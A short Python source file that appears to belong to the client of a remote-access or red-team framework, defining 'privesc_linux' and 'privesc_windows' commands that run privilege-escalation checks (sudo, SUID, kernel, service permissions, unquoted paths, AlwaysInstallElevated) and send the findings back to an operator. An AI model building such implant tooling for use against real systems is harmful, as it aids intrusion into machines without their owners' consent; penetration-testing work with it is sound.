from client.commands.base import Command


class PrivescLinuxCommand(Command):
    name = 'privesc_linux'

    def execute(self, ctx, raw: str):
        from client.modules.privesc.linux import (
            check_sudo_exploits, find_suid_binaries,
            check_kernel_exploits, check_service_permissions,
        )
        results = []
        results.append('=== Sudo Check ===')
        results.append(check_sudo_exploits())
        results.append('=== SUID Binaries ===')
        results.append(find_suid_binaries())
        results.append('=== Kernel ===')
        results.append(check_kernel_exploits())
        results.append('=== Writable Services ===')
        results.append(check_service_permissions())
        ctx.protocol.send('\n'.join(results))
        return True


class PrivescWindowsCommand(Command):
    name = 'privesc_windows'

    def execute(self, ctx, raw: str):
        import os
        if os.name != 'nt':
            ctx.protocol.send('[-] privesc_windows only works on Windows')
            return True
        from client.modules.privesc.windows import (
            check_uac, check_services, check_unquoted_paths,
            check_always_install_elevated,
        )
        results = []
        results.append('=== UAC / Privileges ===')
        results.append(check_uac())
        results.append('=== Services ===')
        results.append(check_services())
        results.append('=== Unquoted Paths ===')
        results.append(check_unquoted_paths())
        results.append('=== AlwaysInstallElevated ===')
        results.append(check_always_install_elevated())
        ctx.protocol.send('\n'.join(results))
        return True
